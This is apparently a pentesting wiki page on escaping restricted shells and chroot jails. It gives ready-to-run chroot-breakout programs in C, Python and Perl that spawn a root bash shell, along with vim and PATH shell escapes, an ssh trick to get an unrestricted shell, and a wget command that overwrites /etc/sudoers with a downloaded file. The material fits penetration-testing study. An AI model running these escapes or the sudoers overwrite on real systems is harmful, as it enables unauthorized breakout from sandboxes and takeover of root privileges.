# Escaping from restricted shells - Jails

## **GTFOBins**

**Search in** [**https://gtfobins.github.io/**](https://gtfobins.github.io/) **if you can execute any binary with "Shell" property**

## Chroot limitation

From [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations):  The chroot mechanism is **not intended to defend** against intentional tampering by **privileged** \(**root**\) **users**. On most systems, chroot contexts do not stack properly and chrooted programs **with sufficient privileges may perform a second chroot to break out**.

Therefore, if you are **root** inside a chroot you **can escape** creating **another chroot**. However, in several cases inside the first chroot you won't be able to execute the chroot command, therefore you will need to compile a binary like the following one and run it:

{% code title="break\_chroot.c" %}
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
    mkdir("chroot-dir", 0755);
    chroot("chroot-dir");
    for(int i = 0; i < 1000; i++) {
        chdir("..");
    }
    chroot(".");
    system("/bin/bash");
}
```
{% endcode %}

Using **python**:

```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
    os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```

Using **perl**:

```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
    chdir ".."
}
chroot ".";
system("/bin/bash");
```

## Modify PATH

Check if you can modify the PATH env variable

```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```

## Using vim

```bash
:set shell=/bin/sh
:shell
```

## Create script

Check if you can create an executable file with _/bin/bash_ as content

```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```

## Get bash from SSH

If you are accessing via ssh you can use this trick to execute a bash shell:

```bash
ssh -t user@<IP> bash # Get directly an interactive shell
```

## Wget

You can overwrite for example sudoers file

```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```

## Other tricks

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)  
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells**]%28https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)  
[https://gtfobins.github.io](https://gtfobins.github.io**]%28https://gtfobins.github.io)  
**It could also be interesting the page:**

{% page-ref page="../useful-linux-commands/bypass-bash-restrictions.md" %}

